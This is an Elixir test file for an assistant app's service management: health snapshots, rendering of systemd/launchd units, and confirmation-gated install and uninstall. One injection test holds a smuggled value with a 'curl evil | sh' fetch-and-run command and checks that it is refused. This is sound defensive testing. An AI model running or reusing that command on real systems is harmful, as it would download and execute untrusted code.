defmodule AllbertAssist.ServeTest do
  @moduledoc """
  v0.62 M5 — health snapshot + per-user service management. The health read is
  bounded and read-only; service install/uninstall are named internal actions
  gated behind :command_execute + confirmation (never off-spine shell); the
  rendered unit pins WorkingDirectory to Allbert Home (closing the cwd-scope
  widening) and sets SHELL (the M0 erlexec finding).
  """
  use AllbertAssist.DataCase, async: false

  alias AllbertAssist.Actions.Runner
  alias AllbertAssist.Actions.Serve.ServiceControl
  alias AllbertAssist.Health
  alias AllbertAssist.Paths
  alias AllbertAssist.Service

  @moduletag :serve_daemon

  test "Health.snapshot reports runtime/database/channels bounded" do
    snap = Health.snapshot()
    assert snap.status in [:ok, :degraded]
    assert snap.runtime in [:up, :down]
    assert snap.database in [:ok, :error]
    assert is_map(snap.channels)
  end

  test "serve_health action is read-only and returns the snapshot + service posture" do
    assert {:ok, %{status: :completed, health: health}} =
             Runner.run("serve_health", %{}, %{user_id: "local"})

    assert Map.has_key?(health, :status)
    assert Map.has_key?(health, :service_platform)
    assert Map.has_key?(health, :service_unit_path)
  end

  test "the rendered service unit pins Allbert Home and SHELL" do
    unit = Service.render_unit("/opt/allbert/bin/allbert")
    assert unit =~ AllbertAssist.Paths.home()
    assert unit =~ "SHELL"
    assert unit =~ "allbert"

    case Service.platform() do
      :launchd -> assert unit =~ "WorkingDirectory" and unit =~ "serve"
      :systemd -> assert unit =~ "WorkingDirectory=" and unit =~ "ExecStart="
      :unsupported -> assert unit == ""
    end
  end

  test "the rendered unit escapes an interpolated Home metacharacter (M8.18)" do
    original_paths = Application.get_env(:allbert_assist, Paths)
    original_home = System.get_env("ALLBERT_HOME")

    on_exit(fn ->
      if original_paths,
        do: Application.put_env(:allbert_assist, Paths, original_paths),
        else: Application.delete_env(:allbert_assist, Paths)

      if original_home,
        do: System.put_env("ALLBERT_HOME", original_home),
        else: System.delete_env("ALLBERT_HOME")
    end)

    # ALLBERT_HOME wins only when the Paths app-env home is unset.
    Application.delete_env(:allbert_assist, Paths)

    case Service.platform() do
      :launchd ->
        System.put_env("ALLBERT_HOME", Path.join(System.tmp_dir!(), "allbert & home"))
        unit = Service.render_unit("/opt/allbert/bin/allbert")
        assert unit =~ "allbert &amp; home"
        refute unit =~ "allbert & home"

      :systemd ->
        System.put_env("ALLBERT_HOME", Path.join(System.tmp_dir!(), "allbert%home"))
        unit = Service.render_unit("/opt/allbert/bin/allbert")
        # `%` is the systemd specifier prefix — it must be doubled.
        assert unit =~ "allbert%%home"

      :unsupported ->
        assert Service.render_unit("/opt/allbert/bin/allbert") == ""
    end
  end

  test "install/uninstall commands use the modern per-user invocations" do
    case Service.platform() do
      :launchd ->
        assert [{"launchctl", ["bootstrap" | _]}] = Service.install_commands()
        assert [{"launchctl", ["bootout" | _]}] = Service.uninstall_commands()

      :systemd ->
        assert Enum.any?(Service.install_commands(), fn {c, a} ->
                 c == "systemctl" and "--user" in a
               end)

      :unsupported ->
        assert Service.install_commands() == []
    end
  end

  describe "service_control (command_execute, confirmation-gated)" do
    test "dry_run previews commands without executing" do
      assert {:ok, %{status: :completed, actions: [%{executed: false, commands: cmds}]}} =
               Runner.run(
                 "service_control",
                 %{operation: "install", dry_run: true},
                 %{user_id: "local"}
               )

      assert is_list(cmds)
    end

    test "the gate deny path executes nothing" do
      denied = %{user_id: "local", selected_action: "unregistered_boundary_probe"}

      assert {:ok, %{status: status, actions: [%{executed: false}]}} =
               ServiceControl.run(%{operation: "install"}, denied)

      assert status in [:denied, :error]
    end

    test "an unknown operation errors without touching the system" do
      assert {:ok, %{status: :error}} =
               Runner.run("service_control", %{operation: "frobnicate"}, %{user_id: "local"})
    end

    test "install rejects a binary param with injection metacharacters (M8.8)" do
      # An approved confirmation reaches execute/install; a binary carrying plist
      # XML / shell metacharacters must be refused before any unit is written.
      approved = %{user_id: "local", confirmation: %{approved?: true}}
      malicious = ~s(/bin/sh</string><string>-c</string><string>curl evil | sh)

      assert {:ok, %{status: :error, actions: [%{executed: false}]}} =
               ServiceControl.run(%{operation: "install", binary: malicious}, approved)
    end

    test "install rejects a symlink or non-executable binary (M8.18)" do
      approved = %{user_id: "local", confirmation: %{approved?: true}}

      dir =
        Path.join(
          System.tmp_dir!(),
          "allbert-svc-#{System.pid()}-#{System.unique_integer([:positive])}"
        )

      File.rm_rf!(dir)
      File.mkdir_p!(dir)
      on_exit(fn -> File.rm_rf!(dir) end)

      # A regular file with no executable bit — refused (lstat + exec-bit check).
      non_exec = Path.join(dir, "not-exec")
      File.write!(non_exec, "")
      File.chmod!(non_exec, 0o644)

      assert {:ok, %{status: :error, actions: [%{executed: false}]}} =
               ServiceControl.run(%{operation: "install", binary: non_exec}, approved)

      # A symlink (even to a valid executable) — refused; lstat must not follow it.
      exec = Path.join(dir, "real-exec")
      File.write!(exec, "")
      File.chmod!(exec, 0o755)
      link = Path.join(dir, "link-exec")
      File.ln_s!(exec, link)

      assert {:ok, %{status: :error, actions: [%{executed: false}]}} =
               ServiceControl.run(%{operation: "install", binary: link}, approved)
    end

    test "the needs_confirmation gate persists a durable, listable record (M8.14)" do
      # v0.62 M8.14: the confirmation floor must create a Confirmations record so
      # `admin confirmations approve <id>` can complete the service change. We
      # assert create + listable + the operation is preserved for resume; we do
      # NOT approve (that would write a real unit file / invoke launchctl/systemctl).
      # command_execute defaults to :denied; grant it so the needs_confirmation
      # floor applies.
      assert {:ok, _} =
               AllbertAssist.Settings.put("permissions.command_execute", "needs_confirmation", %{
                 audit?: false
               })

      assert {:ok, gated} =
               Runner.run("service_control", %{operation: "install"}, %{
                 actor: "local",
                 channel: :cli
               })

      assert gated.status == :needs_confirmation
      assert is_binary(gated.confirmation_id)

      assert {:ok, listed} =
               Runner.run("list_confirmations", %{}, %{actor: "local", channel: :cli})

      record = Enum.find(listed.confirmations, &(&1["id"] == gated.confirmation_id))
      assert record
      assert record["resume_params_ref"]["operation"] == "install"
    end

    test "approval is durable before the injected systemd lifecycle runs" do
      root =
        Path.join(
          System.tmp_dir!(),
          "allbert-service-lifecycle-#{System.unique_integer([:positive])}"
        )

      unit_path = Path.join(root, "allbert.service")
      binary = Path.join(root, "allbert")
      File.mkdir_p!(root)
      File.write!(binary, "#!/bin/sh\n")
      File.chmod!(binary, 0o755)

      previous_service = Application.get_env(:allbert_assist, Service)
      previous_control = Application.get_env(:allbert_assist, ServiceControl)
      test_pid = self()

      Application.put_env(:allbert_assist, Service,
        platform: :systemd,
        unit_path: unit_path,
        manager_available: true
      )

      Application.put_env(:allbert_assist, ServiceControl,
        command_runner: fn cmd, args, _opts ->
          send(test_pid, {:service_command, [cmd | args]})

          if "stop" in args do
            send(test_pid, {:unit_present_when_stop_issued, File.exists?(unit_path)})
          end

          if "disable" in args do
            {"Unit allbert.service not loaded", 5}
          else
            {"", 0}
          end
        end
      )

      on_exit(fn ->
        restore_env(Service, previous_service)
        restore_env(ServiceControl, previous_control)
        File.rm_rf!(root)
      end)

      assert {:ok, _} =
               AllbertAssist.Settings.put("permissions.command_execute", "needs_confirmation", %{
                 audit?: false
               })

      assert {:ok, request} =
               Runner.run("service_control", %{operation: "install", binary: binary}, %{
                 actor: "local",
                 channel: :cli
               })

      assert {:ok, approval} =
               Runner.run("approve_confirmation", %{id: request.confirmation_id}, %{
                 actor: "local",
                 channel: :cli
               })

      assert approval.confirmation["status"] == "approved"

      assert get_in(approval.actions, [Access.at(0), :confirmation_metadata, :target_status]) ==
               :completed

      assert_receive {:service_command, ["systemctl", "--user", "daemon-reload"]}

      assert_receive {:service_command, ["systemctl", "--user", "enable", "allbert.service"]}

      assert_receive {:service_command,
                      ["systemctl", "--user", "start", "--no-block", "allbert.service"]}

      assert File.exists?(unit_path)

      assert {:ok, %{status: :completed}} =
               ServiceControl.run(%{operation: "uninstall"}, %{
                 user_id: "local",
                 confirmation: %{approved?: true}
               })

      refute File.exists?(unit_path)

      assert_receive {:service_command, ["systemctl", "--user", "disable", "allbert.service"]}

      assert_receive {:service_command,
                      ["systemctl", "--user", "stop", "--no-block", "allbert.service"]}

      assert_receive {:unit_present_when_stop_issued, false}

      assert_receive {:service_command, ["systemctl", "--user", "daemon-reload"]}
    end

    test "launchd plist is absent before terminal bootout can stop the daemon" do
      root =
        Path.join(
          System.tmp_dir!(),
          "allbert-launchd-uninstall-#{System.unique_integer([:positive])}"
        )

      plist_path = Path.join(root, "com.lexlapax.allbert.plist")
      File.mkdir_p!(root)
      File.write!(plist_path, "installed")

      previous_service = Application.get_env(:allbert_assist, Service)
      previous_control = Application.get_env(:allbert_assist, ServiceControl)
      test_pid = self()

      Application.put_env(:allbert_assist, Service,
        platform: :launchd,
        unit_path: plist_path,
        manager_available: true
      )

      Application.put_env(:allbert_assist, ServiceControl,
        command_runner: fn cmd, args, _opts ->
          send(test_pid, {:launchd_command, [cmd | args], File.exists?(plist_path)})
          {"", 0}
        end
      )

      on_exit(fn ->
        restore_env(Service, previous_service)
        restore_env(ServiceControl, previous_control)
        File.rm_rf!(root)
      end)

      assert {:ok, %{status: :completed}} =
               ServiceControl.run(%{operation: "uninstall"}, %{
                 user_id: "local",
                 confirmation: %{approved?: true}
               })

      refute File.exists?(plist_path)
      assert_receive {:launchd_command, ["launchctl", "bootout" | _], false}
    end
  end

  defp restore_env(module, nil), do: Application.delete_env(:allbert_assist, module)
  defp restore_env(module, value), do: Application.put_env(:allbert_assist, module, value)
end
